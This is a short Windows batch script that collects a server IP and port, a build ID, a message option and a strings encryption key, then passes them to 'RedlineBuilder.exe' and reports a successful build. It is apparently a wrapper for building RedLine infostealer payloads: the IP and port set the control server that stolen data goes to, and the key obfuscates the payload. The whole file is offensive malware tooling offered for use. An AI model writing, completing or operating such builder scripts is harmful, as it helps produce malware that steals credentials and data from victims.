@echo off
set /p ip="Enter IP and port (e.g. 127.0.0.1:1912): "
set /p id="Enter ID: "
set /p by_parts="Is by parts? (yes/no): "
if /i "%by_parts%"=="yes" set by_parts_arg=-by_parts
set /p msg="Enter message (leave blank for none): "
if not "%msg%"=="" set msg_arg=-msg "%msg%"
set /p key="Enter strings encryption key (leave blank for none):"
if not "%key%"=="" set key_arg=-key %key%

set cmdline=RedlineBuilder.exe -ip %ip% -id %id% %by_parts_arg% %msg_arg%
if not "%key%"=="" set cmdline=%cmdline% %key_arg%

start /wait "" %cmdline%
echo Build successful!
pause